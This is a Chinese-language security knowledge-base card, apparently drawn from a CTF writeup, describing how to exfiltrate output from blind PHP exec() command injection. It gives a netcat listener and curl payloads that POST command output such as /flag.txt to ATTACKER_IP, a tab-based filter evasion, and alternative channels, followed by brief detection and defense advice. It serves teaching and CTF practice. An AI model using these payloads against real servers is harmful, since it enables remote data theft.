---
id: web-php-rce-exec-silent-curl-oob-exfil
title: exec 无回显 RCE 用 curl --data "$(命令)" 外带执行结果
type: scenario
domain: web
path: web/php/rce
technique: blind-rce-oob-exfil
tags:
- php
- blind-rce
- oob
- curl
- exfil
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-33
  verified_at: '2026-11-08T17:02:47+08:00'
  notes: 已对照原文核对：exec无回显源码与curl --data外带命令为原文原文；原文为CTF writeup，无nc收到数据的成功截图，卡内利用步骤与原文一致，技巧完整可复用
url: /docs/web/php/rce/web-php-rce-exec-silent-curl-oob-exfil/
draft: false
kb_aliases:
- 无回显 RCE 外带
- curl OOB 数据外带
---

## 一句话结论

PHP `@exec($_POST['cmd'],$res,$rc)` 不回显结果时，在目标机上用 `curl 公网服务器:端口 --data "$(cat /flag.txt)"` 把命令输出作为请求体发到攻击者服务器完成外带取数。

## 原理

exec 的输出存入 $res 数组但页面不打印，属盲执行；命令注入仍然完整可用。利用 shell 的命令替换 `"$(cmd)"` 在本地先执行内层命令并把 stdout 展开为 curl 的 POST body，curl 将其发往攻击者可控的服务器，从而把盲执行变成可读回显。POST body 不受 URL 长度限制，适合取较长文件内容。

## 触发条件

- 存在可注入的 exec/system 等 shell 执行点且结果不回显；
- 目标机有 curl（或 wget 等）且出网可达攻击者服务器。

## 利用步骤

1. 在攻击者公网服务器上监听，如 `nc -lvnp 8080`；
2. 提交 `cmd=curl http://攻击者IP:8080 --data "$(id)"`，nc 收到 id 输出确认通道；
3. 提交 `cmd=curl http://攻击者IP:8080 --data "$(ca\t /flag.txt)"`（可用 tab 等替代敏感词）读取目标文件内容。

## PoC

```
cmd=curl http://ATTACKER_IP:8080 --data "$(cat /flag.txt)"
```

nc 端收到文件内容即为利用成功（原文场景 flag 位于 /flag.txt，POST cmd 注入点 exec 无回显）。

## 变体与关联

- 不出网时可用 DNS 外带、写文件到 Web 目录、或 sleep/布尔延迟盲注逐位取数；
- 若目标仅 wget，用 `--post-file`；
- 与回显型 RCE 场景互补：回显被注释/被 WAF 拦截时外带是首选。

## 检测与防御

- 检测：Web 进程外连异常 IP、POST 体积小的 curl/wget 子进程；对 cmd 参数含 curl/wget/`$(` 特征告警。
- 防御：禁用 shell 执行函数或用 escapeshellarg 白名单化参数；出口 ACL 限制 Web 进程外连。
